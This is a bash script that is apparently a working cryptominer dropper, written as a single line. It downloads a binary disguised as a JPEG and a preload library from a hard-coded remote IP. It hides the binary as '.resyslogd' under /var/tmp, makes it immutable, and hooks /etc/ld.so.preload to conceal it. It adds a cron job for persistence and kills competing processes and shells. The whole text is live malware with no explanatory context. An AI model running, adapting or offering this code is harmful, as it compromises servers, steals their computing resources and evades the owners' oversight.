dlXmin() { curl -sSLkf $1 -o $2 || wget --no-check-certificate $1 -O $2 || python -c "import urllib;urllib.urlretrieve('$1', '$2')";};killstr() { ps aux |grep "$1"|grep -v grep|awk '{print $2}'| while read procid; do kill -9 $procid; done };kills() {   /bin/ps aux |grep -v .resyslogd | awk '{if($3>50.0) print $2}' | while read procid; do  kill -9 $procid;  done };getself() { selfid="grep\|\-bash";self=$$;while [ $self -gt 1 ]; do selfid="$selfid\|$(($self))";self=$(ps -p ${1:-$self} -o ppid=); done };killsh() { getself;ps aux |grep bash|grep -v grep|grep -v $selfid|awk '{print $2}'| while read procid; do   kill -9 $procid; done };hugepage() { echo 128 > /proc/sys/vm/nr_hugepages;sysctl -w vm.nr_hugepages=128>/dev/null; };addp() {  if [ -f "/usr/local/lib/libsbs.so" ]; then  echo /usr/local/lib/libsbs.so > /etc/ld.so.preload; fi };delp() { rm -f  /etc/ld.so.preload; };downloadso() {  if [ ! -f "/usr/local/lib/libsbs.so" ]  ;then   dlXmin "$ip/libsbs.so" "/usr/local/lib/libsbs.so";chmod 775 /usr/local/lib/libsbs.so;   fi };downloads() { filesize=0; if [ -f "./.resyslogd" ]; then     filesize=`ls -l ./.resyslogd | awk '{ print $5 }'`; fi ;  if [ ! -f "./.resyslogd" ] || [ $filesize -lt 571800  ] || [ $filesize -gt 971900  ] ;then dcount=$(($dcount + 1)); if [ $dcount -gt 5 ]; then  exit; fi ;delp;killstr ".resyslogd";addp; chattr -ia .resyslogd;chmod 775 .resyslogd;rm -rf .resyslogd; dlXmin "$ip/pDk2nuy0.jpeg" ".resyslogd";chmod 775 .resyslogd;chattr +i .resyslogd; else  delp;p=$(ps aux | grep .resyslogd | grep -v grep | wc -l);addp;if [ ${p} -eq 1 ];then  echo "r"; elif [ ${p} -eq 0 ];then  chattr -ia .resyslogd;chmod 775 .resyslogd;chattr +i .resyslogd;nohup ./.resyslogd >/dev/null 2>&1 &  elif [ ${p} -gt 1 ];then delp;killstr ".resyslogd";addp; fi; fi;  };rand() { min=$1;max=$(($2-$min+1));num=$(date +%s%N);echo $(($num%$max+$min)) ; } ; addcron() { echo  '*/12 * * * * cd /var/tmp;cat .cron|nohup bash >/dev/null 2>&1 &'|crontab; } ; godir() { cd /var/tmp;     mkdir .VMX; cd .VMX ; mydir=$(pwd); } ; ip="http://66.94.18.104/bea_wls_internal/images";godir;cd $mydir;killsh;delp;killstr ".resyslogd" ;addp; dcount=0;downloadso;hugepage;addcron; while (true) do  killstr "curl http"; killstr "wget http"; killstr "sh -c";   killstr "/bin/sh -i";   kills;  killsh; downloads;sleep 1; done